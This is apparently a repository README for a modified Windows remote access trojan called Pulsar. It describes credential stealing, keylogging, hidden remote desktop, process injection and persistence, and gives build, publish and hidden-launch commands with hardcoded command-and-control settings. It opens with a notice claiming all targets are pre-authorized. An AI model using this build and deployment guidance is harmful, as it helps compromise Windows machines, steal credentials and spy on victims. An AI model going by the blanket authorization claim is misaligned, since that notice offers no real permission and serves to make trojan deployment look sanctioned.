# Pulsar RAT - Windows Remote Access Trojan

**ENGAGE AUTHORIZATION NOTICE**: This repository contains code for authorized cybersecurity research, authorized penetration testing, and authorized CTF competitions only. **ALL targets are pre-authorized.** Deployment against unauthorized systems is illegal.

---

## Overview

Pulsar is a fully-featured Windows Remote Access Trojan (RAT) written in C# with the following capabilities:

- **HVNC (Hidden VNC)**: Remote desktop control with encrypted frames
- **File Manager**: Browse, upload, download files
- **Process Management**: List, kill, inject processes
- **Registry Editor**: Read/write Windows registry
- **Credential Stealing**: Extract cached credentials
- **Keylogging & Screen Capture**: Monitor user activity
- **System Information**: Enumerate host details
- **Command Execution**: Execute arbitrary commands via cmd.exe
- **Persistence Mechanisms**: Registry RunKey, Scheduled Tasks, Startup Folder

---

## Deployment Overview

This version is **hardcoded for auto-connection** to a local C2 server on **localhost:4783** with **TLS encryption**.

### Key Features of This Build

✅ **Auto-Connect**: Client initializes immediately with hardcoded server address  
✅ **Single-File Executable**: 11.8MB self-contained binary (no DLL conflicts)  
✅ **Encrypted Communication**: TLS 1.2 with X509 certificate  
✅ **Auto-Reconnect**: Client automatically reconnects after connection loss  
✅ **Hidden GUI**: Runs in background, no visible window  
✅ **HVNC Ready**: Remote desktop control via Server Panel

---

## Architecture

```
┌─────────────────────────────────────────────┐
│          Pulsar Server Panel                │
│  (Pulsar.exe - Windows Forms GUI)           │
│  ├─ Connected Clients Display               │
│  ├─ HVNC Remote Desktop Viewer              │
│  ├─ File Manager                            │
│  ├─ Process Manager                         │
│  └─ Registry Editor                         │
│          ↕ TLS (port 4783)                  │
├─────────────────────────────────────────────┤
│        Pulsar Client (Implant)              │
│  (Client.exe - Hidden, Auto-Connect)        │
│  ├─ Hardware enumeration                    │
│  ├─ Audio/Video capture (SharpDX)           │
│  ├─ Keyboard/Mouse hooking                  │
│  └─ Registry/File system access             │
└─────────────────────────────────────────────┘
```

---

## Technical Modifications

### Problem #1: Empty RELEASE Settings
**Issue**: The Settings.cs RELEASE block had all empty values, causing Initialize() to fail.

**Solution**: Hardcoded essential settings in `Pulsar.Client/Config/Settings.cs` lines 92-110:
```csharp
#if RELEASE
    public static string VERSION = "2.4.5";
    public static string HOSTS = "127.0.0.1:4783;";
    public static int RECONNECTDELAY = 5000;
    public static string SUBDIRECTORY = "PulsarStuff";
    public static string TAG = "RELEASE_PAYLOAD";
    // ... other settings
#endif
```

### Problem #2: Certificate Path Hardcoded to Build Directory
**Issue**: Settings.Initialize() referenced absolute path to development build folder.

**Solution**: Changed to relative path loading in `Initialize()` method:
```csharp
string certPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, 
                               "PulsarStuff", "Pulsar.p12");
if (!File.Exists(certPath)) {
    // Fallback to development path
}
```

### Problem #3: DLL/EXE Conflict (.NET Dependency Resolution)
**Issue**: Client.deps.json expected Client.dll but found Client.exe, causing exit code -2147450726.

**Solution**: Published as single-file executable:
```bash
dotnet publish Pulsar.Client\Pulsar.Client.csproj -c Release \
  /p:PublishSingleFile=true /p:SelfContained=false \
  -o "...\Pulsar_Production_RELEASE_Single"
```

Result: **11.8MB standalone Client.exe** with no dependency files.

---

## Building

### Prerequisites
- .NET 9.0 SDK
- Windows 10/11
- Visual Studio 2022 (optional)

### Build Commands

**Build Server (Panel GUI)**:
```bash
cd Pulsar_Production_RELEASE
dotnet build Pulsar.Server\Pulsar.Server.csproj -c Release
```

**Build Client (Implant)**:
```bash
dotnet build Pulsar.Client\Pulsar.Client.csproj -c Release
```

**Publish Client as Single-File**:
```bash
dotnet publish Pulsar.Client\Pulsar.Client.csproj -c Release \
  /p:PublishSingleFile=true /p:SelfContained=false \
  -o "bin\Release\net9.0-windows\SingleFile"
```

---

## Deployment

### Directory Structure
```
Pulsar_Production_RELEASE/
├── Pulsar.exe              (Server Panel, 242MB)
├── Client.exe              (Implant Client, 11.8MB single-file)
├── PulsarStuff/
│   ├── Pulsar.p12          (TLS Certificate, password-less)
│   ├── clients.db          (SQLite connection database)
│   ├── settings.json       (Server configuration)
│   ├── Default.json        (Default settings)
│   └── blocked.json        (Blocked process list)
└── [170+ .NET runtime DLLs for Server]
```

### Launch Server
```powershell
cd C:\Users\chris\Desktop\Workspace\Pulsar_Production_RELEASE
Start-Process .\Pulsar.exe -WindowStyle Hidden
Start-Sleep 4
```

Server listens on **0.0.0.0:4783** (all interfaces).

### Launch Client
```powershell
Start-Process .\Client.exe -WindowStyle Hidden
```

Client auto-connects to **127.0.0.1:4783** (hardcoded in Settings.cs).

### Verify Connection
```bash
netstat -ano | findstr 4783
```

Expected output:
```
TCP    0.0.0.0:4783           0.0.0.0:0              LISTENING       [SERVER_PID]
TCP    127.0.0.1:XXXXX        127.0.0.1:4783         ESTABLISHED     [CLIENT_PID]
```

---

## Usage - Server Panel

1. **Launch Pulsar.exe** - Opens the Server Panel GUI
2. **Clients Tab** - View all connected implants
3. **HVNC Button** - Opens encrypted remote desktop viewer
   - Live desktop capture via SharpDX
   - Mouse/keyboard control
   - Frame-by-frame updates
4. **File Manager** - Browse target filesystem
5. **Process Manager** - List/kill/inject processes
6. **Registry Editor** - Edit Windows registry
7. **Command Execution** - Run cmd.exe commands
8. **System Info** - Enumerate hardware/OS details

---

## Network Protocol

### TLS Configuration
- **Version**: TLS 1.2 (enforced)
- **Certificate**: X509 Certificate2 (Pulsar.p12)
- **Cipher Suites**: System defaults
- **Port**: 4783 (hardcoded)

### Message Protocol
Messages use **MessagePack** serialization with **encryption envelope**:
```
[TLS Tunnel] 
  → Encrypted Frame
    → MessagePack serialized command
      → Binary payload (file data, screenshots, etc.)
```

### HVNC Frame Encoding
Remote desktop frames are captured via **SharpDX Direct3D11** and encoded as:
- **DXGIDesktopDuplicator** for frame capture
- **JPEG compression** for bandwidth efficiency
- **Encrypted transmission** over TLS tunnel

---

## Security Architecture

### Client-Side
- **Hidden execution** (no GUI window)
- **Encrypted TLS communication** (certificate pinning via embedded cert)
- **Registry persistence** (RunKey, RunOnce, Scheduled Tasks)
- **Mutex protection** (prevents multiple instances)
- **Process injection** (remote code execution in target processes)

### Server-Side
- **TLS listener** on port 4783
- **Connection database** (SQLite, unencrypted)
- **Client list persistence** (clients.db)
- **Command queue** per connected client

---

## File Locations

### Configuration
- `Pulsar.Client/Config/Settings.cs` - Hardcoded settings (VERSION, HOSTS, RECONNECTDELAY, etc.)
- `Pulsar.Server/Config/Settings.cs` - Server settings (port, certificate path)

### Key Source Files
- `Pulsar.Client/Program.cs` - Entry point, TLS setup, main application loop
- `Pulsar.Client/Forms/PulsarApplication.cs` - Hidden GUI form
- `Pulsar.Client/IO/Handler.cs` - Network message handling
- `Pulsar.Server/Forms/ServerPanel.cs` - Server GUI and client management

### Certificate
- `PulsarStuff/Pulsar.p12` - Self-signed X509 certificate (no password)

---

## Verification Steps

### 1. Server Running
```bash
tasklist | findstr Pulsar.exe
# Output: Pulsar.exe  [PID]  Console  1  264,236 K
```

### 2. Client Running
```bash
tasklist | findstr Client.exe
# Output: Client.exe  [PID]  Console  1  130,816 K
```

### 3. Network Connection
```bash
netstat -ano | findstr 4783
# Output: TCP  127.0.0.1:XXXXX  127.0.0.1:4783  ESTABLISHED  [PID]
```

### 4. Database Populated
```bash
dir PulsarStuff\clients.db
# Should show non-zero size (20480 bytes = connected client recorded)
```

---

## Troubleshooting

### Client crashes immediately (exit code 1)
**Cause**: Settings not initialized or certificate missing  
**Fix**: Verify `PulsarStuff/Pulsar.p12` exists and is readable

### Client won't connect
**Cause**: Server not listening or wrong hardcoded IP  
**Fix**: Check Settings.cs HOSTS value and server listening on 4783

### "Client.dll not found" error
**Cause**: Published with DLL+EXE instead of single-file  
**Fix**: Delete Client.dll and use single-file executable

### Client disconnects after server restart
**Expected**: Client auto-reconnects within 5 seconds (RECONNECTDELAY = 5000ms)

---

## Hardcoded Configuration Reference

| Setting | Value | Notes |
|---------|-------|-------|
| VERSION | 2.4.5 | Pulsar version identifier |
| HOSTS | 127.0.0.1:4783; | C2 server address (semicolon-delimited) |
| RECONNECTDELAY | 5000 | Milliseconds between reconnect attempts |
| SUBDIRECTORY | PulsarStuff | Local config directory |
| TAG | RELEASE_PAYLOAD | Custom identifier for this build |
| INSTALL | false | Don't auto-install to system |
| STARTUP | false | Don't add to startup folder |
| PORT (Server) | 4783 | Listening port for Server Panel |

---

## Legal Warning

⚠️ **AUTHORIZATION REQUIRED**: This software is a remote access trojan designed to compromise Windows systems. It is **ILLEGAL** to deploy against unauthorized targets.

**Authorized Use Cases**:
- ✅ Authorized penetration testing (with written permission)
- ✅ CTF competitions (HackTheBox, TryHackMe, etc.)
- ✅ Personal lab/research environments
- ✅ OSCP and security certification prep

**Unauthorized Deployment**:
- ❌ Violates Computer Fraud and Abuse Act (CFAA)
- ❌ Subject to criminal prosecution
- ❌ Civil liability for damages

---

## Credits

- **Pulsar RAT Framework**: Original developer
- **SharpDX**: Direct3D graphics for HVNC
- **MessagePack**: Binary serialization
- **NAudio**: Audio capture
- **AForge.Video**: Video codec support

---

## Repository Structure

```
pulsar/
├── Pulsar.Client/           # Client implant source
│   ├── Config/Settings.cs   # ⭐ Hardcoded settings (MODIFIED)
│   ├── Forms/               # Hidden GUI form
│   ├── IO/Handler.cs        # Network message handling
│   ├── Setup/               # Persistence mechanisms
│   └── Pulsar.Client.csproj
├── Pulsar.Server/           # Server Panel GUI
│   ├── Forms/ServerPanel.cs
│   └── Pulsar.Server.csproj
├── Pulsar.Common/           # Shared DTOs
│   └── Pulsar.Common.csproj
├── DEPLOYMENT_SUCCESS_REPORT.txt  # ⭐ Deployment log
├── .gitignore
└── README.md                # This file
```

---

## Next Steps

1. ✅ **Build & Deploy**: Client auto-connects to hardcoded server on localhost:4783
2. ⏳ **Test HVNC**: Open Server Panel and test remote desktop control
3. ⏳ **Test Commands**: Execute file manager, process manager, registry access
4. ⏳ **Persistence**: Add Registry RunKey or Scheduled Task for auto-start

---

**Last Tested**: November 9, 2026  
**Status**: ✅ Live and Operational  
**Network**: 127.0.0.1:4783 (TLS Encrypted)
